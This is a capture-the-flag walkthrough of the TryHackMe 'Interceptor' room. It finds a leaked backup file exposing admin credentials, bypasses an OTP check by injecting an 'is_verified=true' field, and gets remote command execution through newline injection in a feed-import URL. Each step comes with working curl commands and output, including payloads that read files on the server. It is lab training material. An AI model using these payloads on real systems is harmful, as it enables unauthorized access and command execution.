# TryHackMe: Interceptor — Walkthrough

**Date:** 2026-10-29  
**Room:** Interceptor (Premium)  
**Analyst:** Will Lawson  
**Category:** Web Exploitation / Request Tampering / SSRF → Command Injection

---

## Overview

Interceptor is a web room themed around intercepting and modifying traffic between a browser and a "MediaHub" journalist portal. The intended path uses Burp Suite as an intercepting proxy, but **the entire room was solved from the CLI with `curl` alone** — no proxy, no Burp, no browser. Each "intercept and modify" step is just a crafted `curl` request.

The chain: a leaked backup file discloses the admin email and password format → a 2FA/OTP step is bypassed by injecting a client-trusted field into the verify request → an "Import Feed" SSRF feature shells out to `curl`, and a newline in the URL turns it into command injection.

**Flags:**
- Admin login flag: `THM{ADMIN_ACCESS_USING_BURP}`
- `/var/www/user.txt`: `THM{SYSTEM_PWNED_SUCCESSFULLY}`

> **No proxy / no Burp.** Despite the room name and the `_USING_BURP` flag text, nothing here required an intercepting proxy. `curl` is the Repeater. Setting `IP` once (`export IP=10.146.173.88`) lets every request below run as-is.

---

## Enumeration

```
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.7
53/tcp open  domain  ISC BIND 9.16.1 (Ubuntu)
80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))   -- title: MediaHub
```

The DNS on 53 and the `mediahub.thm` domain turned out to be **distractions** — no PTR record, no zone transfer, no useful records. All the action is on port 80.

### Content discovery

The server returns **HTTP 200 for every path** (catch-all page, 1491 bytes), so the miss size must be filtered:

```bash
curl -s -o /dev/null -w '%{http_code} %{size_download}\n' http://$IP/doesnotexist123.php
# 200 1491

ffuf -u http://$IP/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php -fs 1491 -s
```

Notable results: `login.php`, `dashboard.php`, `search.php`, `config.php`, `logout.php`, `phpmyadmin`, and `uploads/` (directory listing **enabled**).

### Reading the client-side login flow

```bash
curl -s http://$IP/login.php | sed -n '/<script>/,/<\/script>/p'
```

The login form posts to `api_login.php` via `fetch()` and blindly trusts the JSON response (`data.ok`, `data.redirect`). A bad login returns:

```json
{"ok":false,"error":"Invalid credentials."}
```

No SQLi, no PHP type-juggling (JSON body rejected: "Email and password are required."). We need real credentials.

---

## Step 1 — Information Disclosure (the backup file)

The key miss in the first `ffuf` run: it only appended `.php`, not `.bak`. The login page has a backup copy that the server serves as **plaintext** (it's not executed as PHP):

```bash
curl -s http://$IP/login.php.bak
```

Developer note inside:

```
| Admin test account for staging environment
| Email: admin@mediahub.thm
|
| Admin password follows company format:
| MediaHub + any year
```

So the password is `MediaHub<year>`. Logging in (box released in 2026):

```bash
curl -s -i -c cj.txt -X POST http://$IP/api_login.php \
  -d 'email=admin@mediahub.thm&password=MediaHub2026'
```

```json
{"ok":true,"message":"Login success. OTP required.","redirect":"otp.php"}
```

`-c cj.txt` saves the authenticated `PHPSESSID` for every subsequent request.

---

## Step 2 — OTP / 2FA Bypass (request tampering)

The OTP page (`otp.php`) posts to `verify_otp.php`. A telling comment in the page JS:

```js
// UI: show only message/error on DOM
```

That implies the JSON response carries fields the browser hides. Submitting a wrong OTP confirms it:

```bash
curl -s -i -b cj.txt -X POST http://$IP/verify_otp.php -d 'otp=000000'
```

```json
{"ok":false,"error":"Invalid OTP. Try again.","is_verified":false}
```

There's the hidden field — `is_verified`. The server reads it from the **request** as well as returning it, so we simply assert it (mass assignment / parameter injection):

```bash
curl -s -b cj.txt -X POST http://$IP/verify_otp.php -d 'otp=000000&is_verified=true'
```

```json
{"ok":true,"message":"OTP verified. Redirecting..."}
```

Session is now fully verified. The dashboard yields the first flag:

```bash
curl -s -b cj.txt http://$IP/dashboard.php | sed 's/<[^>]*>//g' | grep -iE 'THM\{|import|feed'
# Flag: THM{ADMIN_ACCESS_USING_BURP}
```

**First flag:** `THM{ADMIN_ACCESS_USING_BURP}`

---

## Step 3 — SSRF → Command Injection (Import Feed)

The dashboard has an **Import Feed** feature: "Paste a valid RSS/Atom feed URL. The server fetches it and returns the raw output." It posts `url` to `import_feed_api.php`. The client-side JS strips `; & |` from the URL — but that's cosmetic; `curl` bypasses it entirely by posting straight to the API.

### Observing the behaviour

```bash
curl -s -b cj.txt -X POST http://$IP/import_feed_api.php --data-urlencode 'url=http://127.0.0.1/'
# {"ok":false,"error":"Private network access blocked"}     <- SSRF filter

curl -s -b cj.txt -X POST http://$IP/import_feed_api.php --data-urlencode 'url=http://mediahub.thm/;id'
# cmd_output shows: curl: (6) Could not resolve host: mediahub.thm
```

That `cmd_output` field proves the server runs **`curl <url>` in a shell** and returns stdout/stderr. The `;` was stripped **server-side too**, so `;id` and `127.0.0.1;id` just concatenate (`127.0.0.1id`). Both `;` and private IPs are filtered.

### The working injection — newline

The `; & |` strip and the SSRF (private-IP) check are both dodged by using a **newline** to start a fresh shell command line. The host can be any junk value; the fetch failing doesn't matter, the second line runs regardless:

```bash
curl -s -b cj.txt -X POST http://$IP/import_feed_api.php \
  --data-urlencode $'url=http://x/\nid'
```

```json
{"ok":true,"message":"Feed fetched successfully",
 "cmd_output":"uid=33(www-data) gid=33(www-data) groups=33(www-data),1002(findgroup),1003(websql)\n"}
```

RCE as `www-data`. (`$'...\n...'` in bash emits a literal newline; `--data-urlencode` encodes it to `%0a` on the wire.)

### Reading the flag

```bash
curl -s -b cj.txt -X POST http://$IP/import_feed_api.php \
  --data-urlencode $'url=http://x/\ncat /var/www/user.txt'
# {"ok":true,...,"cmd_output":"THM{SYSTEM_PWNED_SUCCESSFULLY}\n"}
```

**Second flag:** `THM{SYSTEM_PWNED_SUCCESSFULLY}`

---

## Full Attack Chain

```
Port 80 — MediaHub (Apache / PHP)
  │
  ├─ ffuf (.bak) → login.php.bak (plaintext backup)
  │     → discloses admin@mediahub.thm + password format "MediaHub<year>"
  │
  ├─ api_login.php  →  MediaHub2026  →  {"ok":true, "OTP required"}
  │
  ├─ verify_otp.php →  otp=000000&is_verified=true   (client-trusted field)
  │     → session verified → dashboard.php
  │     → FLAG 1: THM{ADMIN_ACCESS_USING_BURP}
  │
  └─ import_feed_api.php  (SSRF: server runs `curl <url>` in a shell)
        │  filters: strips ; & |  AND blocks private IPs
        └─ newline injection:  url=http://x/%0a<command>
             → RCE as www-data
             → cat /var/www/user.txt
             → FLAG 2: THM{SYSTEM_PWNED_SUCCESSFULLY}
```

---

## Key Techniques & Gotchas

| Technique | Detail |
|-----------|--------|
| **No proxy needed** | Every "intercept/modify" step is a crafted `curl` request. Burp is one way, not the only way — the room name and flag are misdirection. |
| **`.bak` disclosure** | First `ffuf` only tried `.php`; the win was `login.php.bak`, served as plaintext because the server doesn't execute `.bak`. Always fuzz backup extensions. |
| **Catch-all 200s** | Server returns 200/1491 bytes for every path — filter the miss size (`-fs 1491`) or all enumeration is noise. |
| **Hidden response fields** | The OTP JSON leaked `is_verified`; the server trusted the same field on input. "UI shows only message/error" comment was the tell. |
| **Client-side filtering is cosmetic** | The JS stripped `; & |` from the feed URL — irrelevant when posting directly to the API. Never rely on client validation. |
| **Server-side filter still applied** | The backend *also* stripped `; & |` and blocked private IPs, so `;cmd` and `127.0.0.1` both failed. |
| **Newline injection** | `%0a` isn't in the stripped set and sidesteps the SSRF IP check by putting the command on its own line. `$(...)` also survived the strip but still hit the IP block on local URLs. |
| **DNS/vhost rabbit hole** | Port 53 + `mediahub.thm` looked important; no PTR, no AXFR, no records. A distraction. |
